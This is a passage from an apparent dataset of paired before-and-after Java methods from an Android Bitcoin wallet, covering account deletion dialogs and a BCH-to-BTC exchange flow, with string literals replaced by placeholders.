    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _storage.deleteAccountMetadata(accountToDelete.getId());
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
            _storage.deleteAccountMetadata(linkedColuAccount.getId());
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
        _storage.deleteAccountMetadata(accountToDelete.getId());
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}"
91038,"@Subscribe public void spvSendFundsResult(SpvSendFundsResult event){
  if (!event.operationId.equals(lastOperationId)) {
    return;
  }
  if (!event.isSuccess) {
    new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.error) + ""String_Node_Str"")).setMessage(""String_Node_Str"" + event.message).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
      @Override public void onDismiss(      DialogInterface dialogInterface){
        getActivity().finish();
      }
    }
).create().show();
    return;
  }
  final Order order=new Order();
  order.transactionId=event.txHash;
  order.exchangingAmount=decimalFormat.format(amount);
  order.exchangingCurrency=CurrencyValue.BCH;
  order.receivingAddress=toAccount.getReceivingAddress().get().toString();
  order.receivingAmount=decimalFormat.format(offer.amountTo);
  order.receivingCurrency=CurrencyValue.BTC;
  order.timestamp=SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.LONG,SimpleDateFormat.LONG,Locale.ENGLISH).format(new Date());
  new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.success) + ""String_Node_Str"")).setMessage(Html.fromHtml(getString(R.string.exchange_order_placed_dialog,order.timestamp,order.transactionId,order.exchangingAmount,order.receivingAmount))).setPositiveButton(R.string.save_receipt,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialogInterface,    int i){
      String pdf=new BCHExchangeReceiptBuilder().setTransactionId(order.transactionId).setDate(order.timestamp).setReceivingAmount(order.receivingAmount + ""String_Node_Str"" + order.receivingCurrency).setReceivingAddress(order.receivingAddress).setSpendingAmount(order.exchangingAmount + ""String_Node_Str"" + order.exchangingCurrency).setSpendingAccountLabel(mbwManager.getMetadataStorage().getLabelByAccount(fromAccount.getId())).build();
      String filePart=new SimpleDateFormat(""String_Node_Str"",Locale.US).format(new Date());
      File pdfFile=new File(getActivity().getExternalFilesDir(DIRECTORY_DOWNLOADS),""String_Node_Str"" + filePart + ""String_Node_Str"");
      try {
        OutputStream pdfStream=new FileOutputStream(pdfFile);
        pdfStream.write(pdf.getBytes(""String_Node_Str""));
        pdfStream.close();
      }
 catch (      IOException e) {
        Log.e(TAG,""String_Node_Str"",e);
      }
      DownloadManager downloadManager=(DownloadManager)getActivity().getSystemService(DOWNLOAD_SERVICE);
      downloadManager.addCompletedDownload(pdfFile.getName(),pdfFile.getName(),true,""String_Node_Str"",pdfFile.getAbsolutePath(),pdfFile.length(),true);
    }
  }
).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialogInterface){
      getActivity().finish();
    }
  }
).create().show();
  try {
    ExchangeLoggingService.exchangeLoggingService.saveOrder(order).enqueue(new Callback<Void>(){
      @Override public void onResponse(      Call<Void> call,      Response<Void> response){
        Log.d(TAG,""String_Node_Str"");
      }
      @Override public void onFailure(      Call<Void> call,      Throwable t){
        Log.d(TAG,""String_Node_Str"",t);
      }
    }
);
  }
 catch (  RetrofitError e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
}","@Subscribe public void spvSendFundsResult(SpvSendFundsResult event){
  if (progressDialog != null && progressDialog.isShowing()) {
    progressDialog.dismiss();
  }
  if (!event.operationId.equals(lastOperationId)) {
    return;
  }
  if (!event.isSuccess) {
    new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.error) + ""String_Node_Str"")).setMessage(""String_Node_Str"" + event.message).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
      @Override public void onDismiss(      DialogInterface dialogInterface){
        getActivity().finish();
      }
    }
).create().show();
    return;
  }
  final Order order=new Order();
  order.transactionId=event.txHash;
  order.exchangingAmount=decimalFormat.format(amount);
  order.exchangingCurrency=CurrencyValue.BCH;
  order.receivingAddress=toAccount.getReceivingAddress().get().toString();
  order.receivingAmount=decimalFormat.format(offer.amountTo);
  order.receivingCurrency=CurrencyValue.BTC;
  order.timestamp=SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.LONG,SimpleDateFormat.LONG,Locale.ENGLISH).format(new Date());
  new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.success) + ""String_Node_Str"")).setMessage(Html.fromHtml(getString(R.string.exchange_order_placed_dialog,order.timestamp,order.transactionId,order.exchangingAmount,order.receivingAmount))).setPositiveButton(R.string.save_receipt,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialogInterface,    int i){
      String pdf=new BCHExchangeReceiptBuilder().setTransactionId(order.transactionId).setDate(order.timestamp).setReceivingAmount(order.receivingAmount + ""String_Node_Str"" + order.receivingCurrency).setReceivingAddress(order.receivingAddress).setSpendingAmount(order.exchangingAmount + ""String_Node_Str"" + order.exchangingCurrency).setSpendingAccountLabel(mbwManager.getMetadataStorage().getLabelByAccount(fromAccount.getId())).build();
      String filePart=new SimpleDateFormat(""String_Node_Str"",Locale.US).format(new Date());
      File pdfFile=new File(getActivity().getExternalFilesDir(DIRECTORY_DOWNLOADS),""String_Node_Str"" + filePart + ""String_Node_Str"");
      try {
        OutputStream pdfStream=new FileOutputStream(pdfFile);
        pdfStream.write(pdf.getBytes(""String_Node_Str""));
        pdfStream.close();
      }
 catch (      IOException e) {
        Log.e(TAG,""String_Node_Str"",e);
      }
      DownloadManager downloadManager=(DownloadManager)getActivity().getSystemService(DOWNLOAD_SERVICE);
      downloadManager.addCompletedDownload(pdfFile.getName(),pdfFile.getName(),true,""String_Node_Str"",pdfFile.getAbsolutePath(),pdfFile.length(),true);
    }
  }
).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialogInterface){
      getActivity().finish();
    }
  }
).create().show();
  try {
    ExchangeLoggingService.exchangeLoggingService.saveOrder(order).enqueue(new Callback<Void>(){
      @Override public void onResponse(      Call<Void> call,      Response<Void> response){
        Log.d(TAG,""String_Node_Str"");
      }
      @Override public void onFailure(      Call<Void> call,      Throwable t){
        Log.d(TAG,""String_Node_Str"",t);
      }
    }
);
  }
 catch (  RetrofitError e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
}"
91039,"@OnClick(R.id.buttonContinue) void createAndSignTransaction(){
  mbwManager.runPinProtectedFunction(getActivity(),new Runnable(){
    @Override public void run(){
      buttonContinue.setEnabled(false);
      long fromValue=ExactBitcoinCashValue.from(BigDecimal.valueOf(offer.amountFrom)).getLongValue();
      lastOperationId=UUID.randomUUID().toString();
switch (fromAccount.getType()) {
case BCHBIP44:
{
          Bip44BCHAccount bip44BCHAccount=(Bip44BCHAccount)fromAccount;
          Intent serviceIntent=IntentContract.SendFunds.createIntent(lastOperationId,bip44BCHAccount.getAccountIndex(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
          WalletApplication.sendToSpv(serviceIntent,WalletAccount.Type.BCHBIP44);
          break;
        }
case BCHSINGLEADDRESS:
{
        SingleAddressBCHAccount bip44BCHAccount=(SingleAddressBCHAccount)fromAccount;
        Intent service=IntentContract.SendFundsSingleAddress.createIntent(lastOperationId,bip44BCHAccount.getId().toString(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
        WalletApplication.sendToSpv(service,WalletAccount.Type.BCHSINGLEADDRESS);
        break;
      }
  }
}
}
);
}","@OnClick(R.id.buttonContinue) void createAndSignTransaction(){
  mbwManager.runPinProtectedFunction(getActivity(),new Runnable(){
    @Override public void run(){
      buttonContinue.setEnabled(false);
      long fromValue=ExactBitcoinCashValue.from(BigDecimal.valueOf(offer.amountFrom)).getLongValue();
      lastOperationId=UUID.randomUUID().toString();
switch (fromAccount.getType()) {
case BCHBIP44:
{
          Bip44BCHAccount bip44BCHAccount=(Bip44BCHAccount)fromAccount;
          Intent serviceIntent=IntentContract.SendFunds.createIntent(lastOperationId,bip44BCHAccount.getAccountIndex(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
          WalletApplication.sendToSpv(serviceIntent,WalletAccount.Type.BCHBIP44);
          break;
        }
case BCHSINGLEADDRESS:
{
        SingleAddressBCHAccount bip44BCHAccount=(SingleAddressBCHAccount)fromAccount;
        Intent service=IntentContract.SendFundsSingleAddress.createIntent(lastOperationId,bip44BCHAccount.getId().toString(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
        WalletApplication.sendToSpv(service,WalletAccount.Type.BCHSINGLEADDRESS);
        break;
      }
  }
  progressDialog=new ProgressDialog(getActivity());
  progressDialog.setIndeterminate(true);
  progressDialog.setMessage(getString(R.string.sending));
  progressDialog.show();
}
}
);
}"
91040,"private void createOffer(){
  BigDecimal txFee=UtilsKt.estimateFeeFromTransferrableAmount(fromAccount,mbwManager,BitcoinCash.valueOf(amount).getLongValue());
  Intent changellyServiceIntent=new Intent(getActivity(),ChangellyService.class).setAction(ChangellyService.ACTION_CREATE_TRANSACTION).putExtra(ChangellyService.FROM,ChangellyService.BCH).putExtra(ChangellyService.TO,ChangellyService.BTC).putExtra(ChangellyService.AMOUNT,amount - txFee.doubleValue()).putExtra(ChangellyService.DESTADDRESS,toAccount.getReceivingAddress().get().toString());
  getActivity().startService(changellyServiceIntent);
  progressDialog=new ProgressDialog(getActivity());
  progressDialog.setIndeterminate(true);
  progressDialog.setMessage(""String_Node_Str"");
  progressDialog.show();
}","private void createOffer(){
  BigDecimal txFee=UtilsKt.estimateFeeFromTransferrableAmount(fromAccount,mbwManager,BitcoinCash.valueOf(amount).getLongValue());
  Intent changellyServiceIntent=new Intent(getActivity(),ChangellyService.class).setAction(ChangellyService.ACTION_CREATE_TRANSACTION).putExtra(ChangellyService.FROM,ChangellyService.BCH).putExtra(ChangellyService.TO,ChangellyService.BTC).putExtra(ChangellyService.AMOUNT,amount - txFee.doubleValue()).putExtra(ChangellyService.DESTADDRESS,toAccount.getReceivingAddress().get().toString());
  getActivity().startService(changellyServiceIntent);
  progressDialog=new ProgressDialog(getActivity());
  progressDialog.setIndeterminate(true);
  progressDialog.setMessage(getString(R.string.waiting_offer));
  progressDialog.show();
}"
91041,"private void updateUi(){
  try {
    exchangeFiatRate.setText(Utils.formatFiatWithUnit(mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())))));
  }
 catch (  NumberFormatException ignore) {
  }
  exchangeFiatRate.setVisibility(View.VISIBLE);
  exchangeRate.setText(""String_Node_Str"" + CurrencyValue.fromValue(ExactBitcoinCashValue.ONE,""String_Node_Str"",mbwManager.getExchangeRateManager()));
  exchangeRate.setVisibility(View.VISIBLE);
}","private void updateUi(){
  try {
    CurrencyValue currencyValue=mbwManager.getCurrencySwitcher().getAsFiatValue(ExactBitcoinValue.from(new BigDecimal(toValue.getText().toString())));
    if (currencyValue != null && currencyValue.getValue() != null) {
      exchangeFiatRate.setText(Utils.formatFiatWithUnit(currencyValue));
      exchangeFiatRate.setVisibility(View.VISIBLE);
    }
 else {
      exchangeFiatRate.setVisibility(View.GONE);
    }
  }
 catch (  NumberFormatException ignore) {
  }
}"
91042,"@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
Toast.makeText(getActivity(),""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}","@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_MIN_AMOUNT:
    amount=intent.getDoubleExtra(ChangellyService.AMOUNT,NOT_LOADED);
  if (amount != NOT_LOADED) {
    Log.d(TAG,""String_Node_Str"" + amount);
    sharedPreferences.edit().putFloat(BCH_MIN_EXCHANGE_VALUE,(float)amount).apply();
    minAmount=amount;
  }
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
if (from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(amount / fromAmount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(ChangellyService.BCH) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
exchangeRate.setText(""String_Node_Str"" + decimalFormat.format(fromAmount / amount) + ""String_Node_Str"");
exchangeRate.setVisibility(View.VISIBLE);
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
updateUi();
}
break;
case INFO_ERROR:
new AlertDialog.Builder(getActivity()).setMessage(getString(R.string.exchange_rate_unavailable_msg)).setNegativeButton(R.string.button_cancel,null).setPositiveButton(R.string.try_again,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialogInterface,int i){
BigDecimal val=new BigDecimal(fromValue.getText().toString());
requestOfferFunction(val.toPlainString(),ChangellyService.BCH,ChangellyService.BTC);
}
}
).show();
break;
}
}"
91043,"public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}","public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=getBitcoinCashAccountId(walletAccount);
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}"
91044,"private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account instanceof ColuAccount) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    deleteDialog.setMessage(R.string.delete_account_message);
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _storage.deleteAccountMetadata(accountToDelete.getId());
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
            _storage.deleteAccountMetadata(linkedColuAccount.getId());
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
